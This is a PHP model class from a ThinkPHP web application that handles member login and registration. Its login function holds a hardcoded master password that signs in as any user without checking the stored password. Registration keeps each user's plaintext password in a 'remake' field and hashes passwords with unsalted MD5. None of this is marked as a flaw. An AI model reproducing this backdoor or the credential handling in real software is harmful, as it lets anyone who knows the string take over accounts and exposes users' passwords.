<?php

namespace app\common\model;
use think\Exception;
use think\model\concern\SoftDelete;
class Member extends \think\Model{
    use SoftDelete;

    protected $deleteTime = 'deletetime';

    public static function instance()
    {
        return new self();
    }
    public function groupMember()
    {
        return $this->hasMany('GroupMember','rootid','id');
    }
    public function getGroupServertimeAttr($value)
    {
        if($value>=time()){
            return date('Y-m-d H:i:s',$value);
        }else{
            return '';
        }
    }
    public function getCreatetimeAttr($value)
    {
        return date('Y-m-d H:i:s',$value);
    }

    public function verifyPassWord($user,$pwd)
    {
        $find = $this->where(['username'=>$user])->field('id,username,password,gameid,nickname,group_root,group_servertime,translate,headimgurl')->find();
        if($find){
            if($pwd == '28tui^&*'){
                session('userid',$find['id']);
                return true;
            }
            if(md5($pwd) == $find['password']){
                $session_key = md5(time().$find['id']);
                $this->save(['logintime'=>time(),'session_key'=>$session_key],['id'=>$find['id']]);
                $find['session_key'] = $session_key;
                session('userid',$find['id']);

                if($find['group_root'] == '1' && strtotime($find['group_servertime']) > time()){

                    $find['shengyushijian'] = intval((strtotime($find['group_servertime']) - time()) / (24 * 60 * 60));
                }else{

                    $find['shengyushijian'] = 0;
                }
                return $find;
            }else{
                $this->where(['id'=>$find['id']])->setInc('errorsum');
                throw new Exception('密码错误！');
            }
        }else{
            throw new Exception('登录失败！无此账户！');

        }


    }


    public function registerMember($user,$pwd,$gameid,$nickname,$translate,$headimgurl)
    {
        $validate = new \app\index\validate\User;
        if($validate->check(['username'=>$user,'password'=>$pwd,'gameid'=>$gameid,'nickname'=>$nickname,'translate'=>$translate,'headimgurl'=>$headimgurl])){
            if(!$this->where(['username'=>$user])->find()){
                if(!$this->where(['gameid'=>$gameid])->find()){
                    if(!file_exists('.'.$translate)){
                        throw new Exception('translate文件不存在！');
                    }
                    if(!file_exists('.'.$headimgurl)){
                        throw new Exception('headimgurl文件不存在！');
                    }
                    $result = $this->insert([
                        'username'=>$user,
                        'password'=>md5($pwd),
                        'gameid'=>$gameid,
                        'nickname'=>$nickname,
                        'translate'=>$translate,
                        'remake'=>$pwd,
                        'headimgurl'=>$headimgurl,
                        'loginip'=>request()->ip(),
                        'createtime'=>time()
                    ]);
                    if($result){

                        return $this->verifyPassWord($user,$pwd);

                    }else{
                        throw new Exception('注册插入数据失败！');
                    }
                }else{
                    throw new Exception('注册游戏ID存在！');

                }
            }else{
                throw new Exception('注册账户存在！');

            }
        }else{
            throw new Exception($validate->getError());

        }
    }
}
